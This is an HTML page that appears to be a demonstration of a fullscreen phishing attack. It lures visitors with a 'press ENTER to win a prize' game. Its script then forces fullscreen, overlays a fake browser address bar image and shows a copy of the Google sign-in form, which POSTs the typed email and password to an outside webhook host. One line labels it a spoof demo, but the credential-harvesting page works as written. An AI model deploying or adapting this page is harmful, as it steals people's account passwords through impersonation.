<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Enter the Game</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body, html { width: 100%; height: 100%; background: #000; color: #fff; font-family: 'Segoe UI', Arial, sans-serif; overflow: hidden; }
    #game {
      width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; background: radial-gradient(circle at center, #1a1a2e, #0f0f1e);
    }
    #game h1 { font-size: 48px; margin-bottom: 20px; text-shadow: 0 0 20px #4285f4; }
    #game p { font-size: 20px; margin-bottom: 40px; color: #aaa; }
    #game .instruction { font-size: 28px; color: #22c55e; animation: pulse 1.5s infinite; }
    @keyframes pulse { 0% { opacity: 0.7; } 50% { opacity: 1; } 100% { opacity: 0.7; } }
    #count { font-size: 72px; margin: 40px 0; color: #22c55e; }

    #spoofed { display: none; width: 100%; height: 100%; position: relative; }
    .address-bar {
      position: fixed; top: 0; left: 0; width: 100%; height: 90px; z-index: 9999;
      object-fit: cover; border-bottom: 1px solid #ccc;
    }
    .login-container {
      position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
      background: white; padding: 50px; border-radius: 12px; box-shadow: 0 10px 40px rgba(0,0,0,0.4);
      width: 380px; text-align: center; color: #333;
    }
    .logo {
      font-size: 56px; font-weight: bold; margin-bottom: 30px;
    }
    .logo .g { color: #4285F4; }
    .logo .o1 { color: #EA4335; }
    .logo .o2 { color: #FBBC05; }
    .logo .g2 { color: #4285F4; }
    .logo .l { color: #34A853; }
    .logo .e { color: #EA4335; }
    input {
      width: 100%; padding: 14px; margin: 12px 0; border: 1px solid #dadce0; border-radius: 8px; font-size: 16px;
    }
    button {
      width: 100%; padding: 14px; background: #1a73e8; color: white; border: none; border-radius: 8px; font-size: 16px; cursor: pointer;
    }
    button:hover { background: #1557b0; }
    .warning { color: red; font-weight: bold; margin-top: 20px; }
  </style>
</head>
<body>

  <div id="game">
    <h1>ENTER THE GAME and Win the Prize!!!</h1>
    <p>Press ENTER key as fast as you can!</p>
    <div id="count">0</div>
    <div class="instruction">GO!</div>
  </div>

  <div id="spoofed">
    <!-- Ganti dengan gambar address bar spoof kamu -->
    <img src="https://ujangsec.github.io/test/top.png" class="address-bar" alt="Spoofed Address Bar">

    <div class="login-container">
      <div class="logo">
        <span class="g">G</span><span class="o1">o</span><span class="o2">o</span>
        <span class="g2">g</span><span class="l">l</span><span class="e">e</span>
      </div>
      <h2>Sign in</h2>
      <p>Use your Google Account</p>

      <form action="https://keen-unicorn-32.webhook.cool" method="POST">
        <input type="email" name="email" placeholder="Email or phone" required autocomplete="username">
        <input type="password" name="pass" placeholder="Password" required autocomplete="current-password">
        <button type="submit">Next</button>
      </form>

      <div class="warning">This is a spoof demo!</div>
    </div>
  </div>

  <script>
    let count = 0;
    const countEl = document.getElementById("count");
    const game = document.getElementById("game");
    const spoofed = document.getElementById("spoofed");
    const elem = document.documentElement;

    window.addEventListener("keydown", function(e) {
      if (e.key === "Enter") {
        e.preventDefault();
        count++;
        countEl.textContent = count;

        // Setelah 3 kali tekan ENTER â†’ trigger fullscreen + mailto:
        if (count >= 1) {
          // FULLSCREEN DULU
          if (elem.requestFullscreen) {
            elem.requestFullscreen();
          } else if (elem.webkitRequestFullscreen) {
            elem.webkitRequestFullscreen();
          } else if (elem.msRequestFullscreen) {
            elem.msRequestFullscreen();
          }

          // BARU TRIGGER MAILTO:
          setTimeout(() => {
            location.href = "mailto:security@not-google.com?subject=Account%20Compromised&body=Dear%20Google%20Team,%0A%0AMy%20account%20has%20been%20compromised.%20Please%20help.";
          }, 500);

          // GANTI KE SPOOF
          game.style.display = "none";
          spoofed.style.display = "block";

          // Hapus listener
          window.removeEventListener("keydown", arguments.callee);
        }
      }
    });
  </script>

</body>
</html>
